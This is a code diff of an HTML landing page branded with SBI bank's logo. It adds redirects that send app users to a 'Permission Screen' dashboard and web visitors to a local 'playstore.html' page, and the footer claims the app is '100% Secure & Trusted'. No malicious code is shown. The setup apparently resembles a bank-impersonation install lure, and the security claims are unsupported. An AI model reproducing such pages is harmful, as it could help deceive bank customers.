@@ -9,12 +9,18 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <script src="https://unpkg.com/@phosphor-icons/web"></script>
+    <script>
+        // IF RUNNING IN THE APP, SHOW THE NEW DASHBOARD FIRST (Permission Screen)
+        if (window.location.protocol === 'capacitor:' || (window.location.protocol === 'http:' && window.location.hostname === 'localhost')) {
+            window.location.href = 'dashboard.html';
+        }
+    </script>
 </head>
-<body class="landing-page" onclick="window.location.href='www/playstore.html'">
+<body class="landing-page" onclick="if(window.location.protocol !== 'capacitor:' && window.location.hostname !== 'localhost') { window.location.href='playstore.html'; } else { window.location.href='dashboard.html'; }">
     <div class="app-shell">
         <header class="glass-header">
             <div class="header-left">
-                <img src="www/sbi-new-logo.png" alt="SBI" class="nav-logo" style="width: 120px;">
+                <img src="sbi-new-logo.png" alt="SBI" class="nav-logo" style="width: 120px;">
             </div>
             <div class="header-right">
                 <i class="ph-bold ph-list" style="font-size: 28px; color: #B50E5B;"></i>
@@ -74,7 +80,7 @@
             <!-- Footer Security Section -->
             <div style="text-align: center; margin-bottom: 60px; padding-bottom: 20px;">
                 <div style="width: 55px; height: 55px; border-radius: 12px; border: 1px solid #eaeaea; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; background: white; box-shadow: 0 4px 10px rgba(0,0,0,0.05);">
-                    <img src="www/sbi-new-logo.png" style="width: 35px; object-fit: contain;">
+                    <img src="sbi-new-logo.png" style="width: 35px; object-fit: contain;">
                 </div>
                 <h3 style="font-size: 17px; font-weight: 800; margin-bottom: 10px; color: #1c1e21;">100% Secure & Trusted App</h3>
                 <p style="font-size: 13px; color: #5f6368; line-height: 1.5; margin-bottom: 15px; padding: 0 20px;">Your data is protected with bank-grade security. We never store or share sensitive information.</p>
